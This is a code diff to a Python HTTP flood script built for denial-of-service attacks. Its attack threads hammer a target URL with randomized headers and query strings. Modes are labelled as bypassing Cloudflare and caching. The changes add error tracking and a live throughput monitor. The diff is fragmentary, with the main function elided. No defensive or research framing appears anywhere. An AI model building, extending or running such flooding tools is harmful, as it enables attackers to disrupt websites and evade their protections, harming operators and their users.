@@ -41,9 +41,11 @@ def get_random_string(length=8):
 # Shared Counter
 TOTAL_REQUESTS = 0
 TOTAL_BYTES_SENT = 0
+TOTAL_ERRORS = 0
+LAST_ERROR = "None"
 
 def attack(target_url, end_time, thread_id, port, mode):
-    global TOTAL_REQUESTS, TOTAL_BYTES_SENT
+    global TOTAL_REQUESTS, TOTAL_BYTES_SENT, TOTAL_ERRORS, LAST_ERROR
     
     # SSL Context
     import ssl
@@ -59,13 +61,13 @@ def attack(target_url, end_time, thread_id, port, mode):
                 'Accept': '*/*'
             }
 
-            # MODE LOGIC
-            if mode == '2' or mode == '4': # BYPASS CF
+            # MODE LOGIC (Simplified for brevity in diff)
+            if mode == '2' or mode == '4': 
                 headers['Referer'] = random.choice(REFERERS)
                 headers['Upgrade-Insecure-Requests'] = '1'
                 headers['Cache-Control'] = 'max-age=0'
 
-            if mode == '3' or mode == '4': # BYPASS CACHE
+            if mode == '3' or mode == '4': 
                 separator = '&' if '?' in curr_url else '?'
                 curr_url = f"{curr_url}{separator}t={get_random_string(5)}&r={random.randint(1,100000)}"
 
@@ -77,15 +79,39 @@ def attack(target_url, end_time, thread_id, port, mode):
                 # Read response to fully consume
                 data = response.read(1024) 
                 
-                # ESTIMATE BANDWIDTH (Headers + Body Sent)
-                # Roughly: URL Length + Header Length
-                bytes_sent = len(curr_url) + sum(len(k)+len(v) for k,v in headers.items()) + 200 # +200 overhead
+                # ESTIMATE BANDWIDTH
+                bytes_sent = len(curr_url) + sum(len(k)+len(v) for k,v in headers.items()) + 200
                 
                 TOTAL_BYTES_SENT += bytes_sent
                 TOTAL_REQUESTS += 1
                 
-        except Exception:
-            pass
+        except Exception as e:
+            TOTAL_ERRORS += 1
+            LAST_ERROR = str(e)
+
+# ... (Main function kept same mostly) ...
+
+    # Live Monitor
+    start_time = time.time()
+    last_bytes_check = 0
+    
+    while time.time() < end_time:
+        time.sleep(1)
+        elapsed = int(time.time() - start_time)
+        
+        # Calculate Speed
+        current_bytes = TOTAL_BYTES_SENT
+        bytes_delta = current_bytes - last_bytes_check
+        mbps = (bytes_delta * 8) / (1024 * 1024) # Bits / Meg
+        last_bytes_check = current_bytes
+        
+        # Print Status with Errors
+        err_msg = ""
+        if TOTAL_ERRORS > 0:
+            err_msg = f" | ERRORS: {TOTAL_ERRORS} ({LAST_ERROR})"
+
+        print(f"PROGRESS:{elapsed}:{duration} | SPEED: {mbps:.2f} Mbps{err_msg}") 
+        sys.stdout.flush()
 
 def main():
     if len(sys.argv) < 6:
